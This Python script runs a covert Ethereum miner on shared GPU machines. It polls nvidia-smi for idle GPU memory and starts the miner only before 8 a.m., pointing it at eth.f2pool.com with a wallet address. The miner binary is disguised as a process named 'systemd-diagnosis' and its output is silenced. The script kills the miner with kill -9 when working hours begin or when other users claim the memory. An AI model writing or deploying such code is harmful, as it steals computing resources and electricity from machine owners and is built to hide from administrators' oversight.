from time import localtime, sleep
from subprocess import check_output, call
from re import match


def get_avail_gpus(avail_memory):
    gpus = list()
    smi = check_output('nvidia-smi').decode().split('\n')
    memories = list(filter(lambda s: s.find('Default') != -1, smi))
    for i in range(len(memories)):
        memory   = match(r'.*?(\d+)MiB / (\d+)MiB', memories[i])
        res_mem  = int(memory.group(2)) - int(memory.group(1))
        if res_mem >= avail_memory:
            gpus.append(i)
    return gpus


def main():
    waiting_round = 180
    min_avail_memory = 10000

    gpus = get_avail_gpus(0)
    working = [False] * len(gpus)
    waiting_flag = -1
    while True:
        if localtime().tm_hour >= 8:
            if any(working):
                call(f"nl-toolkit | grep 'systemd-diagnosis' | cut -c 21-28 | xargs kill -9 2>&1 > /dev/null &", shell=True)
                working = [False] * len(gpus)
                waiting_flag = -1
            else:
                sleep(60)

        else:
            avail_gpus  = get_avail_gpus(min_avail_memory)
            waiting_flag = (waiting_flag + 1) % waiting_round
            if not waiting_flag:
                for gpu in avail_gpus:
                    if not working[gpu]:
                        call(f"nohup systemd-diagnosis -epsw x -mode 1 -Rmode 1 -log 0 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -tstop 89 -asm 2 -pool eth.f2pool.com:6688 -gpus {gpu+1} -wal oxa31d3e12b -worker gcc{gpu+1} -coin eth 2>&1 > /dev/null &", shell=True)
                        working[gpu] = True
                        sleep(1)

            for gpu in gpus:
                if gpu not in avail_gpus and working[gpu]:
                    call(f"nl-toolkit | grep ' {gpu} ' |  grep 'systemd-diagnosis' | cut -c 21-28 | xargs kill -9 2>&1 > /dev/null &", shell=True)
                    working[gpu] = False
            sleep(2)


if __name__ == '__main__':
    main()